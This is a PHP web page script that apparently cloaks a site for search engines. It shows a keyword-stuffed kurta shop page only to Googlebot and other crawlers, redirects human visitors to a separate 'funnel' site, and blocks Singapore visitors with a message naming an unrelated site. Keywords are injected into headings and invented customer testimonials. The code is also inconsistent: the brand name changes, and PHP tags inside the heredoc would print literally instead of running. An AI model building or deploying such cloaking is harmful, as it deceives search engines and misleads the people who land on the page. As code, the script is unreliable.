<?php
// =========================================================
// 🚫 Block Singapore traffic (allow Google crawlers / adsbot)
// =========================================================
$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
if (strpos($userAgent, 'googlebot') === false && strpos($userAgent, 'adsbot-google') === false) {
    function getClientIP() {
        foreach (['HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','REMOTE_ADDR'] as $key) {
            if (!empty($_SERVER[$key])) {
                $ipList = explode(',', $_SERVER[$key]);
                return trim($ipList[0]);
            }
        }
        return '0.0.0.0';
    }
    $ip = getClientIP();
    $cacheFile = sys_get_temp_dir() . "/geo_{$ip}.json";
    if (file_exists($cacheFile) && (time() - filemtime($cacheFile)) < 86400) {
        $data = json_decode(file_get_contents($cacheFile), true);
    } else {
        $resp = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,countryCode");
        $data = $resp ? json_decode($resp, true) : null;
        if ($data) file_put_contents($cacheFile, json_encode($data));
    }
    $country = $data['countryCode'] ?? null;
    if ($country === 'SG') {
        http_response_code(403);
        echo "<h1 style='text-align:center;margin-top:20vh;font-family:sans-serif;color:#444;'>Access Restricted</h1>
        <p style='text-align:center;font-family:sans-serif;'>Sorry, TempMessage.com is not available in your region.</p>";
        exit;
    }
}

// =========================================================
// 🌐 SEO Keyword Logic
// =========================================================
$domain = "https://best-clothing-brand.onrender.com";
$keywordsFile = __DIR__ . '/keywords.txt';
$keywordsList = file_exists($keywordsFile)
  ? file($keywordsFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES)
  : [];

if (isset($_GET['q']) && trim($_GET['q']) !== '') {
    $keyword = trim($_GET['q']);
} elseif (!empty($keywordsList)) {
    $daySeed = date('Ymd');
    srand(crc32($daySeed));
    $keyword = $keywordsList[array_rand($keywordsList)];
} else {
    $keyword = 'stylish clothing';
}

$keyword = htmlspecialchars($keyword, ENT_QUOTES, 'UTF-8');
$description = "$keyword We create stylish, comfortable, and affordable clothing for everyday life.";


// =========================================================
// 🤖 Final Bot Detection & Content Output
// =========================================================
$googleBots = ['googlebot', 'adsbot-google', 'bingbot', 'duckduckbot'];
$isBot = false;

foreach ($googleBots as $bot) {
    if (strpos($userAgent, $bot) !== false) {
        $isBot = true;
        break;
    }
}

if ($isBot) {

echo <<<HTML
<!DOCTYPE html>

<html lang="en"><head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
 <meta name="google-site-verification" content="tWKZMQY2_KCE2RYYxnAvs6RGihOwC9YC9bPordzZAN4" />   
<title><?php echo htmlspecialchars($keyword); ?></title>
<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;700;800&amp;display=swap" rel="stylesheet"/>
<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined" rel="stylesheet"/>
<script>
        tailwind.config = {
            darkMode: "class",
            theme: {
                extend: {
                    colors: {
                        "primary": "#0A4842",
                        "background-light": "#F9F6F2",
                        "background-dark": "#1a1a1a",
                        "text-light": "#333333",
                        "text-dark": "#F9F6F2",
                        "secondary-light": "#E6C3C3",
                        "secondary-dark": "#5c4d4d",
                    },
                    fontFamily: {
                        "display": ["Plus Jakarta Sans", "sans-serif"]
                    },
                    borderRadius: {
                        "DEFAULT": "0.25rem",
                        "lg": "0.5rem",
                        "xl": "0.75rem",
                        "full": "9999px"
                    },
                },
            },
        }
    </script>
<style>
        .material-symbols-outlined {
            font-variation-settings: 'FILL' 0, 'wght' 400, 'GRAD' 0, 'opsz' 24;
        }
    </style>
</head>
<body class="bg-background-light dark:bg-background-dark font-display text-text-light dark:text-text-dark">
<div class="relative flex h-auto min-h-screen w-full flex-col group/design-root overflow-x-hidden">
<div class="layout-container flex h-full grow flex-col">
<div class="px-4 md:px-10 lg:px-20 xl:px-40 flex flex-1 justify-center py-5">
<div class="layout-content-container flex flex-col max-w-[1200px] flex-1">
<!-- TopNavBar -->
<header class="sticky top-0 z-50 flex items-center justify-between whitespace-nowrap border-b border-solid border-black/10 dark:border-white/10 px-6 sm:px-10 py-4 bg-background-light/80 dark:bg-background-dark/80 backdrop-blur-sm">
<div class="flex items-center gap-8">
<div class="flex items-center gap-3">
<div class="size-6 text-primary">
<svg fill="none" viewbox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
<path d="M6 6H42L36 24L42 42H6L12 24L6 6Z" fill="currentColor"></path>
</svg>
</div>
<h2 class="text-xl font-bold leading-tight tracking-[-0.015em]">KLOAA</h2>
</div>
<nav class="hidden lg:flex items-center gap-9">
<a class="text-sm font-medium leading-normal hover:text-primary dark:hover:text-secondary-light transition-colors" href="#">New Arrivals</a>
<a class="text-sm font-medium leading-normal hover:text-primary dark:hover:text-secondary-light transition-colors" href="#">Collections</a>
<a class="text-sm font-medium leading-normal hover:text-primary dark:hover:text-secondary-light transition-colors" href="#">Sale</a>
<a class="text-sm font-medium leading-normal hover:text-primary dark:hover:text-secondary-light transition-colors" href="#">About Us</a>
</nav>
</div>
<div class="flex flex-1 justify-end gap-2 md:gap-4">
<label class="hidden sm:flex flex-col min-w-40 !h-10 max-w-64">
<div class="flex w-full flex-1 items-stretch rounded-lg h-full">
<div class="text-text-light/70 dark:text-text-dark/70 flex border border-r-0 border-black/10 dark:border-white/10 bg-black/5 dark:bg-white/5 items-center justify-center pl-3 rounded-l-lg">
<span class="material-symbols-outlined" style="font-size: 20px;">search</span>
</div>
<input class="form-input flex w-full min-w-0 flex-1 resize-none overflow-hidden rounded-lg focus:outline-0 focus:ring-2 focus:ring-primary/50 border border-l-0 border-black/10 dark:border-white/10 bg-black/5 dark:bg-white/5 h-full placeholder:text-text-light/50 dark:placeholder:text-text-dark/50 px-3 rounded-l-none text-sm font-normal leading-normal" placeholder="Search" value=""/>
</div>
</label>
<div class="flex gap-2">
<button class="flex max-w-[480px] cursor-pointer items-center justify-center overflow-hidden rounded-lg h-10 bg-black/5 dark:bg-white/5 hover:bg-black/10 dark:hover:bg-white/10 transition-colors min-w-0 px-2.5">
<span class="material-symbols-outlined text-text-light dark:text-text-dark" style="font-size: 24px;">person</span>
</button>
<button class="flex max-w-[480px] cursor-pointer items-center justify-center overflow-hidden rounded-lg h-10 bg-black/5 dark:bg-white/5 hover:bg-black/10 dark:hover:bg-white/10 transition-colors min-w-0 px-2.5">
<span class="material-symbols-outlined text-text-light dark:text-text-dark" style="font-size: 24px;">shopping_bag</span>
</button>
<button class="lg:hidden flex max-w-[480px] cursor-pointer items-center justify-center overflow-hidden rounded-lg h-10 bg-black/5 dark:bg-white/5 hover:bg-black/10 dark:hover:bg-white/10 transition-colors min-w-0 px-2.5">
<span class="material-symbols-outlined text-text-light dark:text-text-dark" style="font-size: 24px;">menu</span>
</button>
</div>
</div>
</header>
<main class="flex flex-col gap-12 md:gap-20">
<!-- HeroSection -->
<div class="@container mt-4">
<div class="@[480px]:p-4">
<div class="flex min-h-[60vh] md:min-h-[70vh] flex-col gap-6 bg-cover bg-center bg-no-repeat @[480px]:gap-8 rounded-xl items-center justify-center p-6 text-center" data-alt="A model wearing an elegant, flowing green kurtha in a serene, sunlit garden setting." style='background-image: linear-gradient(rgba(0, 0, 0, 0.2) 0%, rgba(0, 0, 0, 0.5) 100%), url("https://lh3.googleusercontent.com/aida-public/AB6AXuDhArJPfCx3G4sySwrnbfaIhynz6dLKeC0805YDNGJYeg2DLlFa1x4fpJFNuZSm8cnHVlxNlLbaWzN-Y3t3WhBuzP6UAwytohtThupM_ZUxFd2ZkHLmnPxAYp3qcFLR0A-Lk0ouAHoX-iJsje8UYhvtT4KP8awyb2EWX3m4ESmU4q_JIzah9nw6Oos9EBVi_e9Nzb15PSGtvrYMzJYIZB8bmw7CG3e2GCQOH9IRVdsQrA77vBYAZiq2KRjUyw-OFTxAQKou-KgEjMs");'>
<div class="flex flex-col gap-4 max-w-2xl">
<h1 class="text-white text-4xl font-black leading-tight tracking-tighter @[480px]:text-5xl @[768px]:text-6xl"><?php echo htmlspecialchars($keyword); ?></h1>
<h2 class="text-white/90 text-base font-normal leading-normal @[480px]:text-lg">Discover our exclusive collection of handcrafted kurthas, designed for the contemporary woman.</h2>
</div>
<button class="flex min-w-[84px] max-w-[480px] cursor-pointer items-center justify-center overflow-hidden rounded-lg h-12 px-5 bg-primary text-white text-base font-bold leading-normal tracking-[0.015em] hover:bg-opacity-90 transition-all shadow-lg">
<span class="truncate">Explore the Collection</span>
</button>
</div>
</div>
</div>
<!-- Product Showcase Grid -->
<section>
<h2 class="text-3xl font-bold leading-tight tracking-tight px-4 pb-4 pt-5 text-center">Featured Styles</h2>
<div class="grid grid-cols-2 md:grid-cols-4 gap-4 p-4">
<div class="flex flex-col gap-3 pb-3 group">
<div class="w-full bg-center bg-no-repeat aspect-[3/4] bg-cover rounded-xl overflow-hidden"><img class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-300" data-alt="Model wearing a vibrant emerald green silk kurtha with intricate gold embroidery." src="https://lh3.googleusercontent.com/aida-public/AB6AXuA-JGA-8qcoa5dE_CVt5MDNAfQhMEUKVfVONAkSSqiB3njcrm_tvBvBgQCPTmdPFE1n6AlzG4tHjiNzjRf5LXqKlGj0YtjC96_cgz7_qcoDs9_wp4o7hBSMp5FGFkLfqK-EnqA2CIvYoCJNWprIyZrbeCCy9RYztl2mfNMTf09Ynp1xPTOTDkiZzOB_N17Pt0Dc4u4MLRU-xIW-QlPneaYQfxN8QiuB-24tYCMznqNuWe744TfKPkdeg-BB6mhFWx9VGr-ZgCrKqiE"/></div>
<div>
<p class="font-medium leading-normal">Emerald Green Silk Kurtha</p>
<p class="text-text-light/70 dark:text-text-dark/70 text-sm font-normal leading-normal">$120.00</p>
</div>
</div>
<div class="flex flex-col gap-3 pb-3 group">
<div class="w-full bg-center bg-no-repeat aspect-[3/4] bg-cover rounded-xl overflow-hidden"><img class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-300" data-alt="Model in a classic maroon cotton kurtha perfect for casual wear." src="https://lh3.googleusercontent.com/aida-public/AB6AXuAywJF4JXfsQ0rIV4v6ecHRADtmz6Jrn7j3clwvgv8w8Lw2EVFght6m5Qk9V1f7AA9nX3r0nE4TdMeXNwJyGzCzJkx4k-_wuhINxvyJnzABtP96yzTHWGmfQOK_mcr3HRVUnu2QKsXOa5kcnu9ryA0TXQifa74CkPVvyuIKbAg6se34pSnDedabFdhdEmAgKQkoFsr7IuFAJFCKETZw-0899EwmP5LfXL1mcX5oT8YPHb_MBNSF_-V48-bL3WkzDq7QiA7PODM2ZoE"/></div>
<div>
<p class="font-medium leading-normal">Classic Maroon Cotton Kurtha</p>
<p class="text-text-light/70 dark:text-text-dark/70 text-sm font-normal leading-normal">$85.00</p>
</div>
</div>
<div class="flex flex-col gap-3 pb-3 group">
<div class="w-full bg-center bg-no-repeat aspect-[3/4] bg-cover rounded-xl overflow-hidden"><img class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-300" data-alt="Elegant blush pink festive kurtha with silver detailing." src="https://lh3.googleusercontent.com/aida-public/AB6AXuBirdrZ1tcEGvvUKFIIp0RrAlUND595V74OANwSB7imvP9BiTcXmT295qSXm8M_I_CAtEyRZE1NzMSRPLzREUQ_mOq-HC_l90p9IBuIg3e1oHKtqkPfEcrD5ftROWX2GKhrefUX1us0IeiVdfegtQCoNu591EXxLa6f9A0YFm_l5XdkWJkI8azv80PfACM1r7ANbM_bFSoWec9jnLjB0I0K-bQlf2RmVbq6VkcFKcHHFjuI-6y3ozlkU0SVH5kZJvm9IZwRE_id2AU"/></div>
<div>
<p class="font-medium leading-normal">Blush Pink Festive Kurtha</p>
<p class="text-text-light/70 dark:text-text-dark/70 text-sm font-normal leading-normal">$155.00</p>
</div>
</div>
<div class="flex flex-col gap-3 pb-3 group">
<div class="w-full bg-center bg-no-repeat aspect-[3/4] bg-cover rounded-xl overflow-hidden"><img class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-300" data-alt="A woman in a simple and elegant ivory white everyday kurtha." src="https://lh3.googleusercontent.com/aida-public/AB6AXuDJx4MYuADEl--8ciWAZVjH0FAu3PF2NyvVkOfQPiWl9DzeWyD2ODwxBwhvMjvYfvaNdhehNt1m4mW2l9iPaTAuGdlLn0pYWLudXyi4UuXkGGu6Ap_-Knw4PGCI2TBqFqyHB255rjpgNHNinmmH_E4LIvk0Nw87-sV0HekNMpKs5sXakrIcGa96Sq1ZBO8d242LX6oAvZOwnfmBO9lpbVGVRKCmQHO147xOn3PdGNt-xQx6BABP9iVH8Xq_HlV3CrU0uM8qLtX7eoI"/></div>
<div>
<p class="font-medium leading-normal">Ivory White Everyday Kurtha</p>
<p class="text-text-light/70 dark:text-text-dark/70 text-sm font-normal leading-normal">$79.00</p>
</div>
</div>
</div>
<div class="flex px-4 py-3 justify-center">
<button class="flex min-w-[84px] max-w-[480px] cursor-pointer items-center justify-center overflow-hidden rounded-lg h-12 px-5 bg-secondary-light/50 text-text-light dark:bg-secondary-dark/50 dark:text-text-dark text-base font-bold leading-normal tracking-[0.015em] hover:bg-secondary-light/80 dark:hover:bg-secondary-dark/80 transition-colors">
<span class="truncate">View All</span>
</button>
</div>
</section>
<!-- Brand Story Section -->
<section class="p-4">
<div class="grid md:grid-cols-2 gap-8 md:gap-12 items-center bg-black/5 dark:bg-white/5 p-8 rounded-xl">
<div class="w-full aspect-[4/3] rounded-lg overflow-hidden">
<img class="w-full h-full object-cover" data-alt="Close-up shot of an artisan's hands weaving intricate patterns on a traditional loom." src="https://lh3.googleusercontent.com/aida-public/AB6AXuBJ0rQWqWGH-Z6n6G3DPC-MlJl-lmJyvEscxL5wO-vR2NZWspQLljnNXojx-08UlIp4vPq47zURvdxbyAURLBTPEbQ4zfKIQSYVSiQprm577q68WDkskWcIZCq5fMbKQz2_37FWHu90oBfUt-4whB_7iERpv-pi05UsDmnM2YRbjs35pcbb0n8q7U-PnnIgv0jjUHOoj2Y3BHEhJBoKUlv17sF9EiEg4AWPzcBdyn72FC8fCsewOr3uujQjo4AQSBV_G1qf6msaUMI"/>
</div>
<div class="flex flex-col gap-4">
<h2 class="text-3xl font-bold leading-tight tracking-tight">The Art of Our Craft</h2>
<p class="text-text-light/80 dark:text-text-dark/80">I<?php echo $keyword; ?> inspired by centuries of tradition, Aura was born from a desire to blend timeless artistry with contemporary design. Each kurtha is a testament to the skill of our artisans, who pour their heart and soul into every stitch. We are committed to ethical practices, sustainable materials, and creating pieces you'll cherish for years to come.</p>
<a class="text-primary font-bold hover:underline" href="#">Learn More About Us</a>
</div>
</div>
</section>
<!-- Testimonial Slider -->
<section class="p-4 flex flex-col items-center gap-6">
<h2 class="text-3xl font-bold leading-tight tracking-tight text-center">What Our Customers Say</h2>
<div class="grid md:grid-cols-3 gap-6 w-full max-w-5xl">
<div class="flex flex-col items-center text-center gap-4 p-6 bg-black/5 dark:bg-white/5 rounded-xl">
<div class="flex text-amber-400">
<span class="material-symbols-outlined">star</span><span class="material-symbols-outlined">star</span><span class="material-symbols-outlined">star</span><span class="material-symbols-outlined">star</span><span class="material-symbols-outlined">star</span>
</div>
<blockquote class="italic text-text-light/80 dark:text-text-dark/80">"<?php echo $keyword; ?> The quality is breathtaking. You can feel the craftsmanship. It's my new favorite piece!"</blockquote>
<p class="font-bold">- Priya S.</p>
</div>
<div class="flex flex-col items-center text-center gap-4 p-6 bg-black/5 dark:bg-white/5 rounded-xl">
<div class="flex text-amber-400">
<span class="material-symbols-outlined">star</span><span class="material-symbols-outlined">star</span><span class="material-symbols-outlined">star</span><span class="material-symbols-outlined">star</span><span class="material-symbols-outlined">star</span>
</div>
<blockquote class="italic text-text-light/80 dark:text-text-dark/80">"Absolutely beautiful and so comfortable. I received so many compliments when I wore it."</blockquote>
<p class="font-bold">- Anjali M.</p>
</div>
<div class="flex flex-col items-center text-center gap-4 p-6 bg-black/5 dark:bg-white/5 rounded-xl">
<div class="flex text-amber-400">
<span class="material-symbols-outlined">star</span><span class="material-symbols-outlined">star</span><span class="material-symbols-outlined">star</span><span class="material-symbols-outlined">star</span><span class="material-symbols-outlined">star_half</span>
</div>
<blockquote class="italic text-text-light/80 dark:text-text-dark/80">"Stunning design and fast shipping. The fabric feels luxurious. Highly recommend."</blockquote>
<p class="font-bold">- Fatima K.</p>
</div>
</div>
</section>
<!-- Email Subscription Form -->
<section class="p-4">
<div class="bg-secondary-light dark:bg-secondary-dark rounded-xl p-8 md:p-12 text-center flex flex-col items-center gap-4">
<h3 class="text-2xl font-bold text-text-light dark:text-text-dark">Join Our Community</h3>
<p class="text-text-light/80 dark:text-text-dark/80 max-w-md"> <?php echo $keyword; ?>Be the first to know about new arrivals, exclusive offers, and behind-the-scenes stories.</p>
<form class="flex flex-col sm:flex-row gap-2 mt-4 w-full max-w-lg">
<input class="form-input flex w-full min-w-0 flex-1 resize-none overflow-hidden rounded-lg h-12 px-4 bg-background-light dark:bg-background-dark border-none focus:ring-2 focus:ring-primary/50 text-base" placeholder="Enter your email address" type="email"/>
<button class="flex items-center justify-center overflow-hidden rounded-lg h-12 px-6 bg-primary text-white text-base font-bold tracking-wide hover:bg-opacity-90 transition-colors">
                                        Subscribe
                                    </button>
</form>
</div>
</section>
</main>
<!-- Footer -->
<footer class="mt-12 md:mt-20 border-t border-black/10 dark:border-white/10 pt-10 pb-6">
<div class="grid grid-cols-2 md:grid-cols-4 gap-8 px-4">
<div class="flex flex-col gap-4 col-span-2 md:col-span-1">
<h4 class="font-bold text-lg">AURA</h4>
<p class="text-sm text-text-light/70 dark:text-text-dark/70 pr-8">Crafting elegance with a modern touch. Discover handcrafted kurthas that tell a story.</p>
</div>
<div class="flex flex-col gap-3">
<h5 class="font-bold">Shop</h5>
<a class="text-sm text-text-light/70 dark:text-text-dark/70 hover:text-primary dark:hover:text-secondary-light" href="#">New Arrivals</a>
<a class="text-sm text-text-light/70 dark:text-text-dark/70 hover:text-primary dark:hover:text-secondary-light" href="#">Collections</a>
<a class="text-sm text-text-light/70 dark:text-text-dark/70 hover:text-primary dark:hover:text-secondary-light" href="#">Sale</a>
</div>
<div class="flex flex-col gap-3">
<h5 class="font-bold">Customer Service</h5>
<a class="text-sm text-text-light/70 dark:text-text-dark/70 hover:text-primary dark:hover:text-secondary-light" href="#">Contact Us</a>
<a class="text-sm text-text-light/70 dark:text-text-dark/70 hover:text-primary dark:hover:text-secondary-light" href="#">FAQ</a>
<a class="text-sm text-text-light/70 dark:text-text-dark/70 hover:text-primary dark:hover:text-secondary-light" href="#">Shipping &amp; Returns</a>
</div>
<div class="flex flex-col gap-3">
<h5 class="font-bold">Follow Us</h5>
<div class="flex gap-4">
<a class="text-text-light/70 dark:text-text-dark/70 hover:text-primary dark:hover:text-secondary-light" href="#">
<svg aria-hidden="true" class="w-6 h-6" fill="currentColor" viewbox="0 0 24 24"><path clip-rule="evenodd" d="M12.315 2c-4.42 0-7.784 3.255-7.784 7.212 0 1.94.737 3.713 2.007 5.056.24.248.33.58.263.91l-.42 1.923c-.157.72.634 1.349 1.313.985l1.968-.998c.28-.142.61-.142.89 0l1.19.604c.78.394 1.63.59 2.48.59 4.42 0 7.784-3.255 7.784-7.212S16.734 2 12.315 2z" fill-rule="evenodd"></path> <!-- Placeholder icon for social media --> </svg>
</a>
<a class="text-text-light/70 dark:text-text-dark/70 hover:text-primary dark:hover:text-secondary-light" href="#">
<svg aria-hidden="true" class="w-6 h-6" fill="currentColor" viewbox="0 0 24 24"><path clip-rule="evenodd" d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z" fill-rule="evenodd"></path> <!-- Placeholder icon for social media --> </svg>
</a>
<a class="text-text-light/70 dark:text-text-dark/70 hover:text-primary dark:hover:text-secondary-light" href="#">
<svg aria-hidden="true" class="w-6 h-6" fill="currentColor" viewbox="0 0 24 24"><path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.71v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84"></path></svg>
</a>
</div>
</div>
</div>
<div class="text-center text-xs text-text-light/50 dark:text-text-dark/50 mt-10 px-4">
<p>© 2024 AURA. All Rights Reserved.</p>
</div>
</footer>
</div>
</div>
</div>
</div>
</body></html>
HTML;

} else {
    // Real humans → Redirect to landing / funnel
    header("Location: https://clothing-brand-eight.vercel.app/");
    exit;
}
?>
